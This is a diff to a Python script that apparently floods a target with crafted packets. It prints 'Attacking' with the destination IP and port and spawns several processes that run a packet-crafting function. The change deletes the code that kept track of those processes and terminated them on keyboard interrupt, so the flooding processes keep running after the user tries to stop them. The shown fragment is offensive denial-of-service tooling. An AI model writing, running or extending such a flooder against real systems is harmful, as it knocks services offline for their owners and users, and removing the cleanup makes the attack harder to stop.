@@ -126,16 +126,9 @@ def craftpkt(DEST_IP, DEST_PORT,type):
 print(__banner__)
 print(f"{colors.cyan}Attacking {DEST_IP} on port {DEST_PORT} with {proces} processes{colors.color_end}")
 try:
-    process_list = []
     for _ in range(proces):
         _process = Process(target=craftpkt, args=(DEST_IP,DEST_PORT,type))
-        process_list.append(_process)
         _process.start()
 except KeyboardInterrupt:
     print(f"{colors.green}Cleaning up!..{colors.color_end}")
-    for _process in process_list:
-        try:
-            _process.terminate()
-        except Exception:
-            continue    
     sys.exit()
